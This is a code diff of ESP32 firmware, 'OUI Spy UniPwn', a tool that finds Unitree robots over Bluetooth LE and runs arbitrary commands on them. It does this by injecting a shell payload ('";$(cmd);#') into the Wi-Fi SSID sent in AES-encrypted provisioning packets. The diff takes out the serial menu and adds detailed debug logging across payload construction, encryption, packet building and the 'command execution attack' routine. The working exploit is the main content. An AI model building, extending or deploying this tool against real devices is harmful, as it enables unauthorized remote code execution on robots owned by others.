@@ -88,7 +88,7 @@ BLEClient* pClient = nullptr;
 BLERemoteCharacteristic* pWriteChar = nullptr;
 BLERemoteCharacteristic* pNotifyChar = nullptr;
 bool deviceConnected = false;
-bool verbose = true;
+bool verbose = true;  // Always enabled - no menu to toggle
 std::vector<uint8_t> receivedNotification;
 bool notificationReceived = false;
 std::map<uint8_t, std::vector<uint8_t>> serialChunks;
@@ -114,8 +114,6 @@ void scanForDevices();
 void startContinuousScanning();
 void stopContinuousScanning();
 void performSingleScan();
-void displayMenu();
-void handleMenuChoice(int choice);
 bool connectToDevice(const UnitreeDevice& device);
 void exploitDevice(const String& ssid, const String& password);
 void loadRecentDevices();
@@ -183,7 +181,7 @@ void setup() {
     setupWebInterface();
 #endif
     
-    // Startup message
+    // Startup message with verbose debugging info
     delay(500); // Let serial stabilize
     Serial.println("");
     Serial.println("+=======================================+");
@@ -198,6 +196,18 @@ void setup() {
     Serial.println("WiFi: UniPwn (password: unipwn123)");
     Serial.println("Web: http://192.168.4.1");
     Serial.println("");
+    Serial.println("=== VERBOSE DEBUG MODE ENABLED ===");
+    Serial.println("All exploitation steps will be logged");
+    Serial.println("");
+    
+    // Debug system information
+    debugPrint("System initialized successfully", "BOOT");
+    debugPrint("Chip: " + String(ESP.getChipModel()) + " Rev " + String(ESP.getChipRevision()), "BOOT");
+    debugPrint("Free heap: " + String(ESP.getFreeHeap() / 1024) + " KB", "BOOT");
+    debugPrint("SPIFFS ready: " + String(SPIFFS.begin(true) ? "YES" : "NO"), "BOOT");
+    debugPrint("BLE stack initialized", "BOOT");
+    debugPrint("Ready for operations", "BOOT");
+    Serial.println("");
 }
 
 void loop() {
@@ -209,23 +219,21 @@ void loop() {
     if (continuousScanning) {
         unsigned long currentTime = millis();
         if (currentTime - lastScanTime >= CONTINUOUS_SCAN_INTERVAL) {
-            infoPrint("Continuous scan cycle - searching for Unitree devices...");
+            debugPrint("Continuous scan cycle - searching for Unitree devices...", "SCAN");
+            debugPrint("Scan interval: " + String(CONTINUOUS_SCAN_INTERVAL) + "ms", "SCAN");
             performSingleScan();
             lastScanTime = currentTime;
             
             // Print current device count
             if (discoveredDevices.size() > 0) {
                 infoPrint("Found " + String(discoveredDevices.size()) + " Unitree device(s) so far");
+            } else {
+                debugPrint("No targets found in this scan cycle", "SCAN");
             }
         }
     }
     
-    if (Serial.available()) {
-        int choice = Serial.parseInt();
-        if (choice > 0) {
-            handleMenuChoice(choice);
-        }
-    }
+    // No menu - all operations via web interface
     delay(10);
 }
 
@@ -299,10 +307,25 @@ void successPrint(const String& message) {
 }
 
 String buildPwn(const String& cmd) {
-    return "\";$(" + cmd + ");#";
+    debugPrint("Building exploit payload for command injection", "EXPLOIT");
+    debugPrint("Raw command: " + cmd, "EXPLOIT");
+    String payload = "\";$(" + cmd + ");#";
+    debugPrint("Payload constructed: " + payload, "EXPLOIT");
+    debugPrint("Payload length: " + String(payload.length()) + " bytes", "EXPLOIT");
+    return payload;
 }
 
 std::vector<uint8_t> encryptData(const std::vector<uint8_t>& data) {
+    debugPrint("Starting AES-128-CFB encryption", "CRYPTO");
+    debugPrint("Plaintext size: " + String(data.size()) + " bytes", "CRYPTO");
+    
+    // Show first few bytes of plaintext for debugging
+    String plaintextHex = "Plaintext (first 16 bytes): ";
+    for (size_t i = 0; i < min((size_t)16, data.size()); i++) {
+        plaintextHex += String(data[i], HEX) + " ";
+    }
+    debugPrint(plaintextHex, "CRYPTO");
+    
     std::vector<uint8_t> encrypted(data.size());
     mbedtls_aes_context aes_ctx;
     size_t offset = 0;
@@ -311,16 +334,30 @@ std::vector<uint8_t> encryptData(const std::vector<uint8_t>& data) {
     // Copy IV since it gets modified
     memcpy(iv_copy, AES_IV, 16);
     
+    debugPrint("AES Key initialized (16 bytes)", "CRYPTO");
+    debugPrint("AES IV initialized (16 bytes)", "CRYPTO");
+    
     mbedtls_aes_init(&aes_ctx);
     mbedtls_aes_setkey_enc(&aes_ctx, AES_KEY, 128);
     mbedtls_aes_crypt_cfb128(&aes_ctx, MBEDTLS_AES_ENCRYPT, data.size(), 
                              &offset, iv_copy, data.data(), encrypted.data());
     mbedtls_aes_free(&aes_ctx);
     
+    // Show first few bytes of ciphertext for debugging
+    String ciphertextHex = "Ciphertext (first 16 bytes): ";
+    for (size_t i = 0; i < min((size_t)16, encrypted.size()); i++) {
+        ciphertextHex += String(encrypted[i], HEX) + " ";
+    }
+    debugPrint(ciphertextHex, "CRYPTO");
+    debugPrint("Encryption complete: " + String(encrypted.size()) + " bytes", "CRYPTO");
+    
     return encrypted;
 }
 
 std::vector<uint8_t> decryptData(const std::vector<uint8_t>& data) {
+    debugPrint("Starting AES-128-CFB decryption", "CRYPTO");
+    debugPrint("Ciphertext size: " + String(data.size()) + " bytes", "CRYPTO");
+    
     std::vector<uint8_t> decrypted(data.size());
     mbedtls_aes_context aes_ctx;
     size_t offset = 0;
@@ -335,16 +372,31 @@ std::vector<uint8_t> decryptData(const std::vector<uint8_t>& data) {
                              &offset, iv_copy, data.data(), decrypted.data());
     mbedtls_aes_free(&aes_ctx);
     
+    // Show first few bytes of decrypted data
+    String decryptedHex = "Decrypted (first 16 bytes): ";
+    for (size_t i = 0; i < min((size_t)16, decrypted.size()); i++) {
+        decryptedHex += String(decrypted[i], HEX) + " ";
+    }
+    debugPrint(decryptedHex, "CRYPTO");
+    debugPrint("Decryption complete: " + String(decrypted.size()) + " bytes", "CRYPTO");
+    
     return decrypted;
 }
 
 std::vector<uint8_t> createPacket(uint8_t instruction, const std::vector<uint8_t>& dataBytes) {
+    debugPrint("=== CREATING PACKET ===", "PACKET");
+    debugPrint("Instruction: 0x" + String(instruction, HEX), "PACKET");
+    debugPrint("Data payload size: " + String(dataBytes.size()) + " bytes", "PACKET");
+    
     std::vector<uint8_t> instructionData = {instruction};
     instructionData.insert(instructionData.end(), dataBytes.begin(), dataBytes.end());
     
     uint8_t length = instructionData.size() + 3;
     std::vector<uint8_t> fullData = {0x52, length};
     fullData.insert(fullData.end(), instructionData.begin(), instructionData.end());
+    
+    debugPrint("Packet header: 0x52 (opcode)", "PACKET");
+    debugPrint("Packet length: " + String(length) + " bytes", "PACKET");
     
     // Calculate checksum
     uint8_t checksum = 0;
@@ -354,25 +406,52 @@ std::vector<uint8_t> createPacket(uint8_t instruction, const std::vector<uint8_t
     checksum = (~checksum + 1) & 0xFF; // Two's complement
     
     fullData.push_back(checksum);
-    return encryptData(fullData);
+    debugPrint("Checksum calculated: 0x" + String(checksum, HEX), "PACKET");
+    debugPrint("Total packet size before encryption: " + String(fullData.size()) + " bytes", "PACKET");
+    
+    // Show full packet structure before encryption
+    String packetHex = "Packet structure: ";
+    for (size_t i = 0; i < min((size_t)32, fullData.size()); i++) {
+        packetHex += String(fullData[i], HEX) + " ";
+    }
+    if (fullData.size() > 32) packetHex += "...";
+    debugPrint(packetHex, "PACKET");
+    
+    std::vector<uint8_t> encrypted = encryptData(fullData);
+    debugPrint("Packet encrypted, final size: " + String(encrypted.size()) + " bytes", "PACKET");
+    return encrypted;
 }
 
 bool genericResponseValidator(const std::vector<uint8_t>& response, uint8_t expectedInstruction) {
+    debugPrint("=== VALIDATING RESPONSE ===", "VALIDATE");
+    debugPrint("Response size: " + String(response.size()) + " bytes", "VALIDATE");
+    
+    // Show full response
+    String responseHex = "Response bytes: ";
+    for (size_t i = 0; i < min((size_t)16, response.size()); i++) {
+        responseHex += String(response[i], HEX) + " ";
+    }
+    if (response.size() > 16) responseHex += "...";
+    debugPrint(responseHex, "VALIDATE");
+    
     if (response.size() < 5) {
         errorPrint("Response packet too short: " + String(response.size()));
         return false;
     }
     
+    debugPrint("Checking opcode: 0x" + String(response[0], HEX) + " (expecting 0x51)", "VALIDATE");
     if (response[0] != 0x51) {
         errorPrint("Invalid opcode in response: 0x" + String(response[0], HEX));
         return false;
     }
     
+    debugPrint("Checking length: packet=" + String(response.size()) + ", header=" + String(response[1]), "VALIDATE");
     if (response.size() != response[1]) {
         errorPrint("Packet length mismatch: Expected " + String(response[1]) + ", Got " + String(response.size()));
         return false;
     }
     
+    debugPrint("Checking instruction: got=0x" + String(response[2], HEX) + ", expected=0x" + String(expectedInstruction, HEX), "VALIDATE");
     if (response[2] != expectedInstruction) {
         errorPrint("Instruction mismatch: Expected " + String(expectedInstruction) + 
                    ", Got " + String(response[2]));
@@ -386,78 +465,28 @@ bool genericResponseValidator(const std::vector<uint8_t>& response, uint8_t expe
     }
     expectedChecksum = (~expectedChecksum + 1) & 0xFF;
     
+    debugPrint("Checking checksum: calculated=0x" + String(expectedChecksum, HEX) + 
+               ", received=0x" + String(response[response.size() - 1], HEX), "VALIDATE");
     if (response[response.size() - 1] != expectedChecksum) {
         errorPrint("Checksum validation failed: Expected 0x" + String(expectedChecksum, HEX) + 
                    ", Got 0x" + String(response[response.size() - 1], HEX));
         return false;
     }
     
-    // Debug the final check
-    styledPrint("[DEBUG] Final validation check: response[3]=0x" + String(response[3], HEX) + " (expecting 0x01)", true);
-    return response[3] == 0x01;
-}
-
-void displayMenu() {
-    Serial.println("\n\033[41;1;37m=== OUI Spy UniPwn Menu ===\033[0m");
-    Serial.println("1. Use web app to start scanning");
-    Serial.println("2. Show recent targets");
-    Serial.println("3. Connect and exploit target");
-    Serial.println("4. Toggle verbose mode (current: " + String(verbose ? "ON" : "OFF") + ")");
-    Serial.println("5. Show attack vectors");
-    Serial.println("6. System information");
-#if ENABLE_WEB_INTERFACE
-    Serial.println("7. Web interface info");
-#endif
-#if ENABLE_BUZZER
-    Serial.println("8. Toggle buzzer feedback (current: " + String(buzzerEnabled ? "ON" : "OFF") + ")");
-#endif
-#if ENABLE_LED_FEEDBACK
-    Serial.println("9. Toggle LED feedback (current: " + String(ledEnabled ? "ON" : "OFF") + ")");
-#endif
-    Serial.print("\n\033[1;31m[//] Enter choice: \033[0m");
-}
-
-void handleMenuChoice(int choice) {
-    switch (choice) {
-        case 1:
-            infoPrint("Scanning disabled from serial. Use web app at http://192.168.4.1");
-            break;
-        case 2:
-            showRecentDevices();
-            break;
-        case 3:
-            selectAndExploitDevice();
-            break;
-        case 4:
-            verbose = !verbose;
-            infoPrint("Verbose mode " + String(verbose ? "enabled" : "disabled"));
-            break;
-        case 5:
-            showPredefinedCommands();
-            break;
-        case 6:
-            showSystemInfo();
-            break;
-#if ENABLE_WEB_INTERFACE
-        case 7:
-            showWebInterfaceInfo();
-            break;
-#endif
-#if ENABLE_BUZZER
-        case 8:
-            toggleBuzzer();
-            break;
-#endif
-#if ENABLE_LED_FEEDBACK
-        case 9:
-            toggleLED();
-            break;
-#endif
-        default:
-            errorPrint("Invalid menu choice");
-            break;
+    debugPrint("Checking status byte: response[3]=0x" + String(response[3], HEX) + " (expecting 0x01)", "VALIDATE");
+    bool isValid = response[3] == 0x01;
+    
+    if (isValid) {
+        successPrint("Response validation PASSED");
+    } else {
+        errorPrint("Response validation FAILED - status byte is not 0x01");
     }
+    
+    return isValid;
 }
+
+// Menu system removed - all control via web interface
+// Verbose debugging is always enabled for full visibility
 
 // BLE Scan callback
 class MyAdvertisedDeviceCallbacks: public BLEAdvertisedDeviceCallbacks {
@@ -634,14 +663,18 @@ void stopContinuousScanning() {
 void performSingleScan() {
     if (!continuousScanning) return; // Safety check
     
+    debugPrint("Initializing BLE scan", "SCAN");
     BLEScan* pBLEScan = BLEDevice::getScan();
     pBLEScan->setAdvertisedDeviceCallbacks(new MyAdvertisedDeviceCallbacks());
     pBLEScan->setActiveScan(true);
     pBLEScan->setInterval(100);
     pBLEScan->setWindow(99);
+    debugPrint("Scan parameters: interval=100, window=99, active=true", "SCAN");
     
     // Very short scan for continuous mode - 1 second
+    debugPrint("Starting 1-second scan cycle", "SCAN");
     BLEScanResults* foundDevices = pBLEScan->start(1, false);
+    debugPrint("Scan cycle complete, clearing results", "SCAN");
     pBLEScan->clearResults();
 }
 
@@ -784,33 +817,61 @@ void addRecentDevice(const UnitreeDevice& device) {
 }
 
 bool executeCommand(const UnitreeDevice& device, const String& command) {
-    Serial.println("[EXPLOIT] Executing command on " + device.address + ": " + command);
+    Serial.println("");
+    Serial.println("========================================");
+    Serial.println("   STARTING COMMAND EXECUTION ATTACK    ");
+    Serial.println("========================================");
+    debugPrint("Target device: " + device.name, "EXPLOIT");
+    debugPrint("Target address: " + device.address, "EXPLOIT");
+    debugPrint("Command to execute: " + command, "EXPLOIT");
     
     // Stop continuous scanning to prevent BLE interference during exploit
     if (continuousScanning) {
-        Serial.println("[EXPLOIT] Stopping BLE scan to prevent interference...");
+        debugPrint("Stopping BLE scan to prevent interference", "EXPLOIT");
         stopContinuousScanning();
         delay(500); // Give BLE stack time to clean up
+        debugPrint("BLE scan stopped successfully", "EXPLOIT");
     }
     
+    debugPrint("Initiating connection to target", "EXPLOIT");
     if (!connectToDevice(device)) {
-        Serial.println("[EXPLOIT] Failed to connect to device");
+        errorPrint("Failed to connect to device");
         return false;
     }
+    successPrint("Connection established");
     
     // Build the exploit payload with the command (per UniPwn research, inject via SSID)
+    debugPrint("Building command injection payload", "EXPLOIT");
     String ssid = buildPwn(command);  // Command injection payload for SSID
     String password = "testpassword";  // Normal password
+    debugPrint("Payload SSID: " + ssid, "EXPLOIT");
+    debugPrint("Payload password: " + password, "EXPLOIT");
     
     // Execute the exploit via validated step-by-step sequence
+    debugPrint("Starting exploit sequence", "EXPLOIT");
     bool success = exploitSequence(ssid, password);
     
     // Disconnect
+    debugPrint("Disconnecting from target", "EXPLOIT");
     if (pClient && pClient->isConnected()) {
         pClient->disconnect();
+        debugPrint("Disconnected successfully", "EXPLOIT");
     }
     
-    Serial.println(String(success ? "[EXPLOIT] Command execution completed" : "[EXPLOIT] Command execution failed"));
+    Serial.println("");
+    if (success) {
+        Serial.println("========================================");
+        Serial.println("     COMMAND EXECUTION COMPLETED        ");
+        Serial.println("========================================");
+        successPrint("Attack completed successfully");
+    } else {
+        Serial.println("========================================");
+        Serial.println("      COMMAND EXECUTION FAILED          ");
+        Serial.println("========================================");
+        errorPrint("Attack failed");
+    }
+    Serial.println("");
+    
     return success;
 }
 
